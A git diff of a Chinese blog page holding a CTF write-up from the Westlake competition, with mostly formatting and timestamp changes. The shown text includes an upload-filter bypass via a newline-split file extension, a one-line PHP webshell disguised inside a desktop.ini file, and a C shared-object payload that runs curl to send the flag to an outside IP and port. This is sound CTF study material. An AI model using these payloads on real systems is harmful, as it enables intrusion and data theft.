@@ -43,7 +43,7 @@
 <meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/11.png">
 <meta property="og:image" content="http://yoursite.com/2020/10/11/westlake/12.png">
 <meta property="article:published_time" content="2020-10-11T10:11:24.000Z">
-<meta property="article:modified_time" content="2020-10-13T11:27:54.847Z">
+<meta property="article:modified_time" content="2020-10-13T11:30:26.007Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="CTFER小白选手">
 <meta name="twitter:card" content="summary">
@@ -232,7 +232,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-10-13 19:27:54" itemprop="dateModified" datetime="2020-10-13T19:27:54+08:00">2020-10-13</time>
+                <time title="Modified: 2020-10-13 19:30:26" itemprop="dateModified" datetime="2020-10-13T19:30:26+08:00">2020-10-13</time>
               </span>
 
           
@@ -281,8 +281,8 @@
 <li>desktop.ini污染马</li>
 <li>php-fpm</li>
 </ul>
-<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>上传文件，经过测试，只有jpg文件才能成功上传，当时比赛环境是被WAF检测的文件都会504</p>
-<p>采取<code>1.p\nh\np\n</code>绕过，同时小马用<code>desktop.ini</code>污染</p>
+<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>上传文件，经过测试，只有<code>jpg</code>文件才能成功上传，当时比赛环境是被<code>WAF</code>检测的文件都会<code>504</code></p>
+<p>采取<code>1.\np\nh\np\n</code>绕过，同时小马用<code>desktop.ini</code>污染</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ï¿½ï¿½</span><br><span class="line">[.ShellClassInfo]</span><br><span class="line">LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,<span class="number">-21770</span></span><br><span class="line">IconResource=%SystemRoot%\system32\imageres.dll,<span class="number">-112</span></span><br><span class="line">IconFile=%SystemRoot%\system32\shell32.dll</span><br><span class="line">IconIndex=<span class="number">-235</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$_GET[<span class="number">0</span>]($_GET[<span class="number">1</span>]);phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>看一下能不能上传成功</p>
@@ -300,13 +300,13 @@
 <img src="/2020/10/11/westlake/9.png" class="">
 
 <p>修改上传的shell，尝试读取<code>flag</code>，发现权限不够</p>
-<p>列<code>tmp</code>目录，可以发现sock文件</p>
+<p>列<code>tmp</code>目录，可以发现<code>sock</code>文件</p>
 <img src="/2020/10/11/westlake/10.png" class="">
 
 <p>下面的步骤来自几篇博客文章</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;06&#x2F;10&#x2F;2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;186186#h2-7</span><br></pre></td></tr></table></figure>
 
-<p>在自己的服务器上部署so文件，用<code>gcc</code>编译</p>
+<p>在自己的服务器上部署<code>so</code>文件，用<code>gcc</code>编译</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"curl 123.56.22.0:6666/`/readflag`"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>payload是改自p神的项目，附上地址</p>
@@ -315,7 +315,7 @@
 <p>具体的原理可以看一下上面的两篇文章，下面就直接放复现的payload截图了</p>
 <img src="/2020/10/11/westlake/11.png" class="">
 
-<p>通过<code>copy</code>函数，将自己服务器上编译完成的so文件复制到题目的<code>tmp</code>路径下，再访问上传的文件，同时监听6666端口，可以看到flag被成功带出</p>
+<p>通过<code>copy</code>函数，将自己服务器上编译完成的so文件复制到题目的<code>tmp</code>路径下，再访问上传的文件，同时监听<code>6666</code>端口，可以看到flag被成功带出</p>
 <img src="/2020/10/11/westlake/12.png" class="">
 
 
@@ -402,7 +402,10 @@
     <a href="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/" rel="prev" title="phpMyAdmin-4.8.1-CVE-2018-12613">
       <i class="fa fa-chevron-left"></i> phpMyAdmin-4.8.1-CVE-2018-12613
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/" rel="next" title="ApacheHTTPD换行解析漏洞CVE-2017-15715">
+      ApacheHTTPD换行解析漏洞CVE-2017-15715 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -486,14 +489,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">63</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-count">35</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
